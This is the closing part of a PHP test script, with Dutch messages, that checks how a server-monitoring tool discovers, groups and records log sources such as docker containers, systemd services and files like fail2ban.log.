ok(count($lf['groups']['docker']) === 1 && $lf['groups']['docker'][0]['rec'] && $lf['groups']['units'][0]['name'] === 'ssh.service' && end($lf['groups']['units'])['kind'] === 'journal',
    'containers (ongeldige naam weg), services met de aanbevolen bovenaan en de hele journal onderaan');
ok($lf['pending'] && $lf['new'] === 0 && $lf['noread'] === ['/var/log/private'], 'nog een verzoek open (teller 2, lijst van verzoek 1); de eerste keer niets "nieuw"; geen leesrechten genoemd');
LogStore::save($ha, ['kind' => 'file', 'spec' => '/var/log/nginx/*', 'name' => 'nginx']);
$lfScan['files'][] = ['/var/log/fail2ban.log', 9, $lfT];
$lfScan['req'] = 2;
LogStore::storeScan($ha, $lfScan);
q("UPDATE agent_data SET updated_at = NOW() - INTERVAL 1 MINUTE WHERE host_id = ? AND metric = 'logscan'", [$ha]);
Paths::cleanAgentData($ha, now());
$lf = LogStore::found($ha);
$lfBy = array_column($lf['groups']['dirs'], null, 'name');
ok(!$lf['pending'] && $lf['new'] === 1 && $lfBy['fail2ban.log']['new'] && $lfBy['nginx']['have'] && !$lfBy['auth.log']['have'],
    'opnieuw gezocht: fail2ban.log is nieuw, nginx is al verzameld (met een eigen patroon), en de lijst blijft na het opruimen van een rapport');

echo "\n" . ($fails ? "✘ $fails van $n mislukt\n" : "✔ alle $n tests geslaagd\n");
exit($fails ? 1 : 0);
